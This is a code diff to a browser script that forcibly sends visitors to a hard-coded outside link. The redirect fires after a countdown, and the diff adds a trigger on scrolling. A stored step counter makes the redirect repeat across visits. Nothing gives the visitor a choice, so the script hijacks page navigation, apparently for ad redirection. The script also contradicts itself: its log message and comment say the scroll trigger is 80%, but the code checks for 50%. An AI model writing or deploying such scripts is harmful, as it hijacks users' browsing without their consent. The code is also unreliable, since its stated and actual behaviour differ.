@@ -1,5 +1,5 @@
 // === CONFIGURATION ===
-const redirectUrl = "https://otieu.com/4/9421366"; // 👈 change this to your redirect link
+const redirectUrl = "https://otieu.com/4/9421366"; // 👈 your redirect link
 const pattern = [10, 20, 0]; // seconds (0 = no redirect)
 const key = "visitStep";
 
@@ -21,6 +21,15 @@ function nextStep() {
   saveStep(step);
 }
 
+// === REDIRECT FUNCTION ===
+function doRedirect() {
+  if (window._alreadyRedirected) return; // prevent double redirect
+  window._alreadyRedirected = true;
+  nextStep();
+  window.location.href = redirectUrl;
+}
+
+// === MAIN FUNCTION ===
 function startRedirectTimer() {
   const step = getStep();
   const delay = pattern[step];
@@ -31,22 +40,33 @@ function startRedirectTimer() {
     return;
   }
 
-  console.log(`Redirecting in ${delay} seconds...`);
+  console.log(`Redirecting in ${delay} seconds or on 80% scroll...`);
   let secondsLeft = delay;
 
+  // start countdown redirect
   const countdown = setInterval(() => {
     secondsLeft--;
     if (secondsLeft <= 0) {
       clearInterval(countdown);
-      nextStep();
-      window.location.href = redirectUrl;
+      doRedirect();
     }
   }, 1000);
 
-  // if user refreshes, don't skip — step stays same until full wait done
-  window.addEventListener("beforeunload", () => {
-    // do not advance the step if user leaves early
-  });
+  // scroll listener (redirect after 80% scroll if not already redirected)
+  function checkScroll() {
+    const scrollTop = window.scrollY || document.documentElement.scrollTop;
+    const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+    const scrollPercent = (scrollTop / scrollHeight) * 100;
+    if (scrollPercent >= 50) {
+      clearInterval(countdown);
+      window.removeEventListener("scroll", checkScroll);
+      doRedirect();
+    }
+  }
+  window.addEventListener("scroll", checkScroll);
+
+  // if user refreshes early, keep same step
+  window.addEventListener("beforeunload", () => {});
 }
 
 // === RUN SCRIPT ===
